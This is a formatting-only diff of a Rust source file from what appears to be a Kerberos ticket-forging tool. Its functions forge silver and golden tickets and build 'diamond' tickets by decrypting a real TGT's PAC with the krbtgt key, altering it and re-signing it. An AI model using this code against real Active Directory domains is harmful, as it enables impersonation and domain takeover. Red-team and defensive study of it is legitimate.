@@ -1,6 +1,6 @@
-use std::error::Error;
-use ms_pac_forge::pac::ForgeIdentity;
 use ms_pac_forge::forge::{forge_golden_tgt, forge_silver_tgt};
+use ms_pac_forge::pac::ForgeIdentity;
+use std::error::Error;
 
 #[derive(Debug, Clone)]
 pub struct ForgeParams {
@@ -97,13 +97,8 @@ pub fn silver_ticket(
         extra_sids: Vec::new(),
     };
 
-    let forged = forge_silver_tgt(
-        &identity,
-        &params.domain,
-        service_key,
-        service_spn,
-        use_rc4,
-    ).map_err(|e| format!("Silver ticket forge failed: {}", e))?;
+    let forged = forge_silver_tgt(&identity, &params.domain, service_key, service_spn, use_rc4)
+        .map_err(|e| format!("Silver ticket forge failed: {}", e))?;
     let ticket_bytes = forged.ticket_cipher().to_vec();
 
     Ok(ForgeResult {
@@ -142,11 +137,14 @@ pub async fn diamond_ticket(params: &DiamondParams) -> Result<ForgeResult, Box<d
         no_preauth: false,
         etype,
         nopac: false,
-    }).await?;
+    })
+    .await?;
 
     log::info!(
         "Diamond: obtained real TGT for {} (etype {}, {} bytes)",
-        tgt_result.username, tgt_result.etype, tgt_result.ticket.len()
+        tgt_result.username,
+        tgt_result.etype,
+        tgt_result.ticket.len()
     );
 
     // Step 2: Extract the enc-part cipher from the raw Ticket
@@ -164,8 +162,8 @@ pub async fn diamond_ticket(params: &DiamondParams) -> Result<ForgeResult, Box<d
     log::info!("Diamond: decrypted PAC ({} bytes)", pac_bytes.len());
 
     // Step 4: Parse the PAC and modify fields
-    let parsed_pac = ms_pac_forge::parse_pac(&pac_bytes)
-        .map_err(|e| format!("PAC parse failed: {}", e))?;
+    let parsed_pac =
+        ms_pac_forge::parse_pac(&pac_bytes).map_err(|e| format!("PAC parse failed: {}", e))?;
 
     log::debug!("Diamond: PAC has {} buffers", parsed_pac.buffers.len());
 
@@ -185,7 +183,8 @@ pub async fn diamond_ticket(params: &DiamondParams) -> Result<ForgeResult, Box<d
         &params.krbtgt_key,
         &params.krbtgt_key,
         params.use_rc4,
-    ).map_err(|e| format!("PAC re-sign failed: {}", e))?;
+    )
+    .map_err(|e| format!("PAC re-sign failed: {}", e))?;
 
     log::info!("Diamond: PAC re-signed ({} bytes)", re_signed_pac.len());
 
@@ -216,7 +215,9 @@ fn extract_enc_part_from_ticket(ticket_bytes: &[u8]) -> Result<Vec<u8>, Box<dyn 
     let inner = unwrap_application(ticket_bytes, 1)?;
     let mut pos = 0;
     while pos < inner.len() {
-        if pos >= inner.len() { break; }
+        if pos >= inner.len() {
+            break;
+        }
         let tag = inner[pos];
         pos += 1;
         let len = parse_length(inner, &mut pos)?;
@@ -281,7 +282,8 @@ fn unwrap_application(data: &[u8], expected_tag: u8) -> Result<&[u8], Box<dyn Er
         return Err("empty data".into());
     }
     let tag = data[0];
-    if tag != (0x60 | expected_tag) && tag != (0x40 | expected_tag) && tag != (0xa0 | expected_tag) {
+    if tag != (0x60 | expected_tag) && tag != (0x40 | expected_tag) && tag != (0xa0 | expected_tag)
+    {
         // Also try constructed form
         if tag != (0x60 | expected_tag) {
             // Try to skip any outer wrapper
@@ -320,7 +322,9 @@ fn unwrap_octet_string(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
 }
 
 fn parse_length(data: &[u8], pos: &mut usize) -> Result<usize, Box<dyn Error>> {
-    if *pos >= data.len() { return Err("truncated length".into()); }
+    if *pos >= data.len() {
+        return Err("truncated length".into());
+    }
     let first = data[*pos];
     *pos += 1;
     if first < 0x80 {
@@ -363,8 +367,16 @@ fn base64_encode(data: &[u8]) -> String {
         let triple = (b0 << 16) | (b1 << 8) | b2;
         result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
         result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
-        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] as char } else { '=' });
-        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] as char } else { '=' });
+        result.push(if chunk.len() > 1 {
+            CHARS[((triple >> 6) & 0x3F) as usize] as char
+        } else {
+            '='
+        });
+        result.push(if chunk.len() > 2 {
+            CHARS[(triple & 0x3F) as usize] as char
+        } else {
+            '='
+        });
     }
     result
 }
